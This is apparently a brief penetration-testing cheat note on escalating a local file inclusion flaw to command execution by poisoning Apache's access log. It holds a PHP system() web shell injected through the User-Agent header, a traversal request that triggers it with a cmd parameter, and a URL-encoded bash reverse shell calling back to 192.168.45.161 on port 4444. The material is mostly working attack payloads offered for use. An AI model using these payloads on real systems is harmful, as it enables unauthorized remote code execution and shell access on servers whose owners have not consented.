If an LFI vulnerability is present, we can potentially alter log files to enable command execution.

Requirements: LFI and log file

Example: `index.php?page=../../../../var/log/apache2/access.log

Exploitation Example
```bash
# Example
index.php?page=../../../../var/log/apache2/access.log

# Intercept request and modify User-Agent field:
User-Agent: <?php echo system($_GET['cmd']); ?>

# Send

# Visit site and append cmd to url
index.php?page=../../../../var/log/apache2/access.log&cmd=whoami
```
See [[Web Shells]] if not php

With this, you can append more complex commands via URL encoding

Example Commands:
```bash
ls%20-la

bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.161%2F4444%200%3E%261%22

...
```
